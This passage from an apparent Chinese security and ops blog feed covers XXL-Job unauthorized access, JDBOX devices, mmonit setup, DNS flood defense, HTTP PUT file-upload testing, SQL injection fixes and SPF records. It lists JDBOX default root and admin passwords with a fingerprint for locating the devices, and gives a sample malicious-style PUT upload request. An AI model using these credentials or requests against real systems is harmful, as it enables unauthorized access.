class="hljs-punctuation">,</span> handler:com.xxl.job.core.handler.impl.ScriptJobHandler<span class="hljs-title">@73</span><span class="hljs-keyword">c</span><span class="hljs-number">20054</span><br></code></pre></td></tr></table></figure><h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>增加授权验证，配置xxl.job.accessToken</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://github.com/vulhub/vulhub/tree/master/xxl-job/unacc">https://github.com/vulhub/vulhub/tree/master/xxl-job/unacc</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secvulns</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secvulns</tag>
      
      <tag>xxl-job</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jdbox</title>
    <link href="/2024/05/31/security/secvulns/jdbox/jdbox/"/>
    <url>/2024/05/31/security/secvulns/jdbox/jdbox/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h3 id="云主机部署管理方式"><a href="#云主机部署管理方式" class="headerlink" title="云主机部署管理方式"></a>云主机部署管理方式</h3><p>WEB:</p><p>​https:__ip:58443</p><p>​用户名密码：admin&#x2F;jdcloud.1qazXSW@</p><p>SSH:</p><p>​ssh端口：58022</p><p>​用户名密码：root&#x2F;LTAI5tJUWg8Hzemb4bvK6XvbTdb</p><p>Console:</p><p>​用户名密码：root&#x2F;LTAI5tJUWg8Hzemb4bvK6XvbTdb</p><p><img src="/image-20240531154445126.png" alt="image-20240531154445126"></p><h3 id="IDC部署管理方式"><a href="#IDC部署管理方式" class="headerlink" title="IDC部署管理方式"></a>IDC部署管理方式</h3><p>WEB：</p><p>​https:__ip:58443</p><p>​用户名密码：admin&#x2F;jdcloud.1qazXSW@</p><p>SSH:</p><p>​ssh端口：58022</p><p>​用户名密码：root&#x2F;LTAI5tJUWg8Hzemb4bvK6XvbTdb</p><p>Console:</p><p>​用户名密码：root&#x2F;LTAI5tJUWg8Hzemb4bvK6XvbTdb</p><p><img src="/image-20240531154754178.png" alt="image-20240531154754178"></p><h3 id="指纹信息"><a href="#指纹信息" class="headerlink" title="指纹信息"></a>指纹信息</h3><h4 id="58443"><a href="#58443" class="headerlink" title="58443"></a>58443</h4><p>Title：包含“JDBOX”字符</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>JDBOX - 概览 - LuCI<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secvulns</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secvulns</tag>
      
      <tag>jdbox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mmonit_install</title>
    <link href="/2024/05/29/yunwei/applications/mmonit/mmonit_install/"/>
    <url>/2024/05/29/yunwei/applications/mmonit/mmonit_install/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>1、下载文件</p><p>wget  <a href="https://mmonit.com/dist/mmonit-4.2.2-linux-x64.tar.gz">https://mmonit.com/dist/mmonit-4.2.2-linux-x64.tar.gz</a></p><p>2、解压文件</p><p>tar -zxvf mmonit-4.2.2-linux-x64.tar.gz</p><p>3、启动守护程序</p><p>cd mmonit-4.2.2&#x2F;</p><p>.&#x2F;bin&#x2F;mmonit</p><p>4、修改监听端口</p><p>配置文件：.&#x2F;conf&#x2F;server.xm</p><p>默认端口：8080</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;Connector address<span class="hljs-operator">=</span><span class="hljs-string">&quot;*&quot;</span> port<span class="hljs-operator">=</span><span class="hljs-string">&quot;8080&quot;</span> processors<span class="hljs-operator">=</span><span class="hljs-string">&quot;25&quot;</span> /&gt;<br></code></pre></td></tr></table></figure><p>修改监听端口：54321</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;Connector address<span class="hljs-operator">=</span><span class="hljs-string">&quot;*&quot;</span> port<span class="hljs-operator">=</span><span class="hljs-string">&quot;54321&quot;</span> processors<span class="hljs-operator">=</span><span class="hljs-string">&quot;25&quot;</span> /&gt;<br></code></pre></td></tr></table></figure><p>5、重新启动</p><p>kill mmonit 进程</p><p>.&#x2F;bin&#x2F;mmonit</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">0.0.0.0:54321</span>           <span class="hljs-number">0.0.0.0</span>:*               LISTEN      <span class="hljs-number">2963155</span>/./bin/mmoni<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
      <category>mmonit</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>mmonit</tag>
      
      <tag>进程监控</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dns_flood</title>
    <link href="/2024/05/29/security/netSec/ddos/dns_flood/"/>
    <url>/2024/05/29/security/netSec/ddos/dns_flood/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><ul><li><p>针对缓存服务器攻击</p><p>攻击者直接或间接向DNS缓存服务器发送大量不存在的域名解析请求，导致DNS缓存服务器不停向授权服务器发送解析请求，最终导致DNS缓存服务器超载，影响正常业务。</p></li><li><p>针对授权服务器攻击</p><p>攻击者直接或间接向DNS授权服务器发送大量不存在的子域名请求，致使DNS服务器严重超载，无法继续响应正常用户的DNS请求，从而达到攻击的目的。</p></li></ul><h2 id="防御原理"><a href="#防御原理" class="headerlink" title="防御原理"></a>防御原理</h2><h3 id="伪造源对缓存服务器的攻击防御"><a href="#伪造源对缓存服务器的攻击防御" class="headerlink" title="伪造源对缓存服务器的攻击防御"></a>伪造源对缓存服务器的攻击防御</h3><p>基于目的地址对DNS Request报文的速率进行统计，当DNS Request报文的速率超过阈值时，启动源认证防御。源认证只针对访问受攻击域名的源IP地址实施，以减少误判和避免对正常业务的访问延时</p><p>源认证包括以下三种模式：</p><ul><li><p>基本模式：在源认证过程中Anti-DDoS设备会触发客户端以TCP报文发送DNS请求，用以验证源IP的合法性，但在一定程度上会消耗DNS缓存服务器的TCP连接资源。“基本”模式源认证防御的处理过程如图1所示。</p></li><li><p>增强模式：原理和基本模式相同，但在源认证过程中，Anti-DDoS设备还充当代理的角色，使用一个与DNS缓存服务器路由可达的代理IP地址，将客户端发送的TCP格式的DNS请求报文转换为UDP格式并发送到DNS缓存服务器，从而减少消耗DNS缓存服务器的TCP连接资源。“增强”模式源认证防御的处理过程如图1所示。</p><p>当DNS缓存服务器被人为禁止提供基于TCP的DNS域名服务时，需要选择“增强”模式。</p></li><li><p>被动模式：对不支持以TCP报文发送DNS请求的客户端进行合法性认证，例如一些代理设备不响应DNS源探测报文或者在NAT场景下NAT设备不响应源探测报文。“被动”模式是将每个源IP地址发送的首包丢弃，触发重新请求，然后对DNS重传报文进行域名检查，如果后续报文和首包请求的域名相同则将源IP地址加入白名单。</p><p>这种被动模式防御方法在现网上是防御DNS缓存服务器的虚假源Request flood攻击的首选。</p></li></ul><h2 id="防御原理（针对虚假源攻击授权服务器）"><a href="#防御原理（针对虚假源攻击授权服务器）" class="headerlink" title="防御原理（针对虚假源攻击授权服务器）"></a>防御原理（针对虚假源攻击授权服务器）</h2><p>授权服务器源认证（即重定向方式），可以有效防御DNS Request Flood虚假源攻击。重定向只针对访问受攻击域名的源IP地址实施，以减少误判和避免对正常业务的访问延时。</p><p>如图2所示，Anti-DDoS设备基于目的地址对DNS Request报文的速率进行统计，当DNS Request报文的速率超过阈值时，启动重定向。</p><ol><li>Anti-DDoS设备返回给请求源一个别名地址，如果请求源是虚假源，则不会回应重定向报文，认证不通过，报文丢弃。</li><li>如果请求源是真实源，则重新请求Anti-DDoS设备发送的重定向地址。认证通过，Anti-DDoS设备将此真实源加入白名单。</li><li>Anti-DDoS设备再次重定向正确的地址，请求源重新请求正确地址，报文命中白名单，直接通过Anti-DDoS设备，到达授权服务器，完成报文交互。</li></ol><h4 id="防御原理（针对真实源攻击）"><a href="#防御原理（针对真实源攻击）" class="headerlink" title="防御原理（针对真实源攻击）"></a>防御原理（针对真实源攻击）</h4><p>如果是真实源攻击，经过上述防御过程后，通过的DNS报文还很大，则可以继续采用以下方式进行防御。</p><p>DNS请求报文限速：对于大流量的DNS Request flood攻击也是一种非常有效的防御方式，Anti-DDoS设备支持以下几种DNS request报文限速。</p><ul><li><p>指定域名限速</p><p>对匹配了指定域名的DNS request报文进行限速，Anti-DDoS设备将直接丢弃超出阈值的DNS request报文。</p><p>建议该指定DNS域名为发生攻击后的被访问频率最高Top N域名，可以从DNS报表的“请求Top N趋势”分析中获取被访问频率最高的Top N域名及其访问流量，被攻击域名一般在受攻击前不在Top N访问中，受攻击后才出现在Top N访问中。另外，当未知域名检测上报异常事件，通过配置异常抓包任务提取指纹，从指纹中也可获取未知域名。</p></li><li><p>源IP限速</p><p>对匹配了的DNS request报文进行限速，Anti-DDoS设备将直接丢弃超出阈值的DNS request报文。</p><p>限速可以针对指定源IP地址或者非指定源IP地址。如果是针对指定源IP地址限速，则建议该指定IP地址为发生攻击后，访问频率最高Top N源IP地址，可以从DNS报表的“请求Top N趋势”分析中获取访问频率最高的Top N源IP地址及其访问流量，此源IP地址一般在受攻击前不在Top N访问中，受攻击后才出现在Top N访问中。</p></li></ul><h2 id="防护手段"><a href="#防护手段" class="headerlink" title="防护手段"></a>防护手段</h2><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1] DNS Request Flood攻击与防御原理 fcm 2015-10-19 09:37:15</p><p><a href="https://forum.huawei.com/enterprise/zh/thread/580896074497933313">https://forum.huawei.com/enterprise/zh/thread/580896074497933313</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>netSec</category>
      
      <category>ddos</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>netSec</tag>
      
      <tag>ddos</tag>
      
      <tag>dnsflood</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/05/22/security/secvulns/fileupload/http_put_fileupload/"/>
    <url>/2024/05/22/security/secvulns/fileupload/http_put_fileupload/</url>
    
    <content type="html"><![CDATA[<h2 id="漏洞名称"><a href="#漏洞名称" class="headerlink" title="漏洞名称"></a>漏洞名称</h2><p>HTTP PUT方法 任意文件上传漏洞</p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>PUT方法是HTTP协议中的一种请求方法，通常用于向服务器上传文件或创建新资源。然而，如果服务器没有正确验证或限制对PUT方法的访问权限，攻击者可以构造恶意的PUT请求，将恶意文件上传到服务器上，进而执行任意代码或者破坏目标系统的完整性。</p><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>1、执行任意代码：攻击者可以通过上传包含恶意代码的文件，执行任意代码并控制受害者的计算机或服务器，导致数据泄露、破坏或其他恶意行为。<br>2、篡改或删除数据：攻击者可以上传包含恶意代码的文件，并篡改或删除服务器上的重要文件或数据。<br>3、钓鱼攻击：攻击者可上传 html、shtm 等文件，并写入非法博彩、赌博等恶意 SEO 页面或者写入恶意 js 文件进行钓鱼来非法获取用户信息等。</p><h2 id="缓解建议"><a href="#缓解建议" class="headerlink" title="缓解建议"></a>缓解建议</h2><p>1、服务器应该实施严格的访问控制和验证机制，确保只有经过授权的用户或应用程序才能使用PUT方法进行文件上传。<br>2、服务器应该对上传的文件进行检查和过滤，以防止恶意文件的上传和执行。</p><p>实例</p><p>1、访问直接解析</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">PUT</span> <span class="hljs-string">/sources/11111.html</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>f.us.domain.cn<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>35<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>11111<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>Tengine<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>0<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Wed, 22 May 2024 08:40:07 GMT<br><span class="hljs-attribute">x-oss-request-id</span><span class="hljs-punctuation">: </span>664DAF676EA3F73037378CE5<br><span class="hljs-attribute">x-oss-cdn-auth</span><span class="hljs-punctuation">: </span>success<br><span class="hljs-attribute">ETag</span><span class="hljs-punctuation">: </span>&quot;823E0B91796126F2B1E60EF194CE38C8&quot;<br><span class="hljs-attribute">x-oss-hash-crc64ecma</span><span class="hljs-punctuation">: </span>16081951038133101936<br><span class="hljs-attribute">Content-MD5</span><span class="hljs-punctuation">: </span>gj4LkXlhJvKx5g7xlM44yA==<br><span class="hljs-attribute">x-oss-server-time</span><span class="hljs-punctuation">: </span>18<br><span class="hljs-attribute">Ali-Swift-Global-Savetime</span><span class="hljs-punctuation">: </span>1716367207<br><span class="hljs-attribute">Via</span><span class="hljs-punctuation">: </span>cache44.l2cn2633[35,34,200-0,M], cache44.l2cn2633[41,0], cache6.cn5084[142,142,200-0,M]<br><span class="hljs-attribute">X-Cache</span><span class="hljs-punctuation">: </span>MISS TCP_MISS dirn:-2:-2<br><span class="hljs-attribute">X-Swift-SaveTime</span><span class="hljs-punctuation">: </span>Wed, 22 May 2024 08:40:07 GMT<br><span class="hljs-attribute">X-Swift-CacheTime</span><span class="hljs-punctuation">: </span>0<br><span class="hljs-attribute">Timing-Allow-Origin</span><span class="hljs-punctuation">: </span>*<br><span class="hljs-attribute">EagleId</span><span class="hljs-punctuation">: </span>968a4c9917163672074216800e<br><br></code></pre></td></tr></table></figure><p>http:__f.us.domain.cn&#x2F;sources&#x2F;11111.html 访问直接解析</p><p>2、访问下载文件</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">PUT</span> <span class="hljs-string">/sources/11111.html</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>f.us.domain.cn<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>35<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>11111<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/05/17/security/websec/sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/05/17/security/websec/sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>修复方案</p><blockquote><p>解决 SQL 注入问题的关键是对所有可能来自用户输入的数据进行严格的检查、对数据库配置使用最小权限原则。</p></blockquote><ol><li>所有的查询语句都使用数据库提供的参数化查 询接口（如 ORM、预编译语句等），参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中。当前几乎所有的数据库系统都提供了参数化 SQL 语句执行接口，使 用此接口可以非常有效的防止 SQL 注入攻击</li><li>对进入数据库的特殊字符（<code>&#39;</code> <code>&quot;</code> <code>\</code> <code>&lt;</code> <code>&gt;</code> <code>&amp;</code> <code>*</code> <code>;</code> 等）进行转义处理，或编码转换</li><li>严格限制变量类型，比如整型变量就采用 <code>intval()</code> 函数过滤，数据库中的存储字段必须对应为 <code>int</code> 型</li><li>数据长度应该严格规定，能在一定程度上防止比较长的 SQL 注入语句无法正确执行</li><li>网站每个数据层的编码统一，建议全部使用 <code>UTF-8</code> 编码，上下层编码不一致有可能导致一些过滤模型被绕过</li><li>严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害</li><li>避免网站显示 SQL 错误信息，比如类型错误、字段不匹配等，防止攻 击者利用这些错误信息进行一些判断</li><li>在网站发布之前建议使用一些专业的 SQL 注入检测工具进行检测，及时修补这些 SQL 注入漏洞</li><li>部署 Web 应用防火墙 可以 避免受到 SQL 注入漏洞的影响</li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>error_almalinux_no_init.d</title>
    <link href="/2024/05/17/yunwei/errors/error_almalinux_no_init.d/"/>
    <url>/2024/05/17/yunwei/errors/error_almalinux_no_init.d/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>在AlmaLinux release 9.2 (Turquoise Kodkod)系统中没有找到&#x2F;etc&#x2F;init.d文件夹，该文件夹常备用来设置服务启动</p><p>因为是由一个chkconfig的包来实现脚本的服务管理的，&#x2F;etc&#x2F;init.d&#x2F;也只是&#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F;的软连接，所以没有&#x2F;etc&#x2F;init.d就把chkconfig的包装一下就行了</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">dnf <span class="hljs-keyword">install</span> chkconfig<br></code></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>[1] linux &#x2F;etc&#x2F;init.d&#x2F;目录不存在  2023-03-08 11:16 碎了的冰</p><p><a href="https://www.cnblogs.com/lightice/p/17191350.html">https://www.cnblogs.com/lightice/p/17191350.html</a></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>errors</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>errors</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>spf</title>
    <link href="/2024/05/16/security/mailsec/spf/"/>
    <url>/2024/05/16/security/mailsec/spf/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="SPF-Sender-Policy-Framework"><a href="#SPF-Sender-Policy-Framework" class="headerlink" title="SPF(Sender Policy Framework)"></a>SPF(Sender Policy Framework)</h1><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a><strong>作用</strong></h3><p>可以防止别人伪造你来发邮件，是一个反伪造邮件的解决方案。</p><p>当你定义了你的邮箱域名的 SPF 记录之后，接收邮件方会根据你的SPF记录来确定连接过来的IP地址是否被包含在 SPF 记录里面，如果在，则认为是一份正确的邮件，否则则认为是一份伪造的邮件。</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a><strong>语法</strong></h3><p>SPF简单说就是域名DNS的txt记录</p><p>SPF 记录包含在一个 TXT 记录中</p><h4 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h4><p> <strong>v&#x3D;spf1 [[pre] type [ext]] … [mod]</strong></p><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p>每个参数的含义：</p><p>v&#x3D;spf1 : SPF 的版本，如果使用 Sender ID 的话，这个字段就应该是 v&#x3D;spf2</p><p>pre: 定义匹配时的返回值</p><p>可能返回值包括：</p><p>+，在验证完成的时候表示通过。 </p><p>- 表示验证失败。这个值通常是 -all ，表示没有其他任何匹配发生，会直接丢弃邮件。</p><p>~ 表示软验证，通常表示验证没有完成，不会直接丢弃邮件，可能会进入垃圾箱或者隔离。 </p><p>? 表示不置可否。这个值也通常在测试没有完成的时候使用</p><p>type:定义使用的确认测试的类型</p><p>可能的值包括：</p><p><a href="https://blog.51cto.com/alandai/1929489">https://blog.51cto.com/alandai/1929489</a></p><p><a href="http://www.magicwinmail.com/technic_spf.php">http://www.magicwinmail.com/technic_spf.php</a></p><p><a href="https://help.aliyun.com/knowledge_detail/36771.html">https://help.aliyun.com/knowledge_detail/36771.html</a></p><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>v&#x3D;spf1 a mx -all</p><p>表示允许a记录和MX服务器的A记录发送邮件</p><p>v&#x3D;spf1 a:test.com -all</p><p>表示允许test.com域名的a记录发送邮件</p><p>v&#x3D;spf1 a&#x2F;24 a:test.test.com&#x2F;24 -all</p><p>表示允许a记录的C段都允许,如果test.test.com存在多个A记录地址，每个A记录的C段都允许发送邮件</p><p>v&#x3D;spf1 mx mx:test.domain.com -all</p><p>表示当前域名的mx记录对应的a记录IP，和test.domain.com的mx记录对应的a记录IP允许发送邮件</p><h3 id="查看方法"><a href="#查看方法" class="headerlink" title="查看方法"></a><strong>查看方法</strong></h3><h4 id="Windows："><a href="#Windows：" class="headerlink" title="Windows："></a><strong>Windows：</strong></h4><p><strong>nslookup -q&#x3D;txt domain</strong></p><p><strong>nslookup -type&#x3D;txt domain</strong></p><h5 id="有SPF的域名"><a href="#有SPF的域名" class="headerlink" title="有SPF的域名"></a>有SPF的域名</h5><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">D:\&gt;nslookup -q=txt qq.com</span><br><span class="hljs-section">服务器:  UnKnown</span><br><span class="hljs-section">Address:  10.211.1.8</span><br><br><span class="hljs-section">非权威应答:</span><br>qq.com  text =<br><br>        <span class="hljs-string">&quot;v=spf1 include:spf.mail.qq.com -all&quot;</span><br></code></pre></td></tr></table></figure><p>解释：include:spf.mail.qq.com表示使用spf.mail.qq.com的spf记录</p><p>​      -all 表示除spf.mail.qq.com spf设置的IP外，其他的硬拒绝，就是完全不收</p><p>因为spf其实最终都是针对IP进行限制的，所以想要看具体限制的IP，可以接着查询对应域名的spf记录，例如查询spf.mail.qq.com</p><p><strong>nslookup -type&#x3D;txt spf.mail.qq.com</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs stylus">D:\&gt;nslookup -q=txt spf<span class="hljs-selector-class">.mail</span><span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span><br>服务器:  UnKnown<br>Address:  <span class="hljs-number">10.211</span>.<span class="hljs-number">1.8</span><br><br>非权威应答:<br>spf<span class="hljs-selector-class">.mail</span><span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span> text =<br><br>        <span class="hljs-string">&quot;v=spf1 include:qq-a.mail.qq.com include:qq-b.mail.qq.com include:qq-c.mail.qq.com include:biz-a.mail.qq.com include:biz-b.mail.qq.com include:biz-c.mail.qq.com include:biz-d.mail.qq.com -all&quot;</span><br><br>mail<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>     nameserver = ns-cnc2<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span><br>mail<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>     nameserver = ns-cnc1<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span><br>ns-cnc1<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>  internet <span class="hljs-selector-tag">address</span> = <span class="hljs-number">111.161</span>.<span class="hljs-number">107.195</span><br>ns-cnc1<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>  internet <span class="hljs-selector-tag">address</span> = <span class="hljs-number">116.128</span>.<span class="hljs-number">153.20</span><br>ns-cnc1<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>  internet <span class="hljs-selector-tag">address</span> = <span class="hljs-number">58.251</span>.<span class="hljs-number">103.109</span><br>ns-cnc2<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>  internet <span class="hljs-selector-tag">address</span> = <span class="hljs-number">111.161</span>.<span class="hljs-number">107.195</span><br>ns-cnc2<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>  internet <span class="hljs-selector-tag">address</span> = <span class="hljs-number">58.251</span>.<span class="hljs-number">103.109</span><br>ns-cnc1<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>  AAAA IPv6 <span class="hljs-selector-tag">address</span> = <span class="hljs-number">2402</span>:<span class="hljs-number">4</span>e00:<span class="hljs-number">8030</span>::<span class="hljs-number">3</span><br><br>D:\&gt;nslookup -q=txt qq-<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.mail</span><span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span><br>服务器:  UnKnown<br>Address:  <span class="hljs-number">10.211</span>.<span class="hljs-number">1.8</span><br><br>非权威应答:<br>qq-<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.mail</span><span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>        text =<br><br>        <span class="hljs-string">&quot;v=spf1 ip4:101.226.139.0/25 ip4:101.91.43.0/25 ip4:101.91.44.128/25 ip4:112.64.237.128/25 ip4:116.128.173.0/25 ip4:121.51.40.128/25 ip4:121.51.6.0/25 ip4:162.62.52.214 ip4:162.62.55.67 ip4:162.62.57.0/24 ip4:162.62.58.211 ip4:162.62.58.216 -all&quot;</span><br><br>mail<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>     nameserver = ns-cnc1<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span><br>mail<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>     nameserver = ns-cnc2<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span><br>ns-cnc1<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>  internet <span class="hljs-selector-tag">address</span> = <span class="hljs-number">116.128</span>.<span class="hljs-number">153.20</span><br>ns-cnc1<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>  internet <span class="hljs-selector-tag">address</span> = <span class="hljs-number">58.251</span>.<span class="hljs-number">103.109</span><br>ns-cnc1<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>  internet <span class="hljs-selector-tag">address</span> = <span class="hljs-number">111.161</span>.<span class="hljs-number">107.195</span><br>ns-cnc2<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>  internet <span class="hljs-selector-tag">address</span> = <span class="hljs-number">58.251</span>.<span class="hljs-number">103.109</span><br>ns-cnc2<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>  internet <span class="hljs-selector-tag">address</span> = <span class="hljs-number">111.161</span>.<span class="hljs-number">107.195</span><br>ns-cnc1<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>  AAAA IPv6 <span class="hljs-selector-tag">address</span> = <span class="hljs-number">2402</span>:<span class="hljs-number">4</span>e00:<span class="hljs-number">8030</span>::<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><h5 id="没有spf的记录"><a 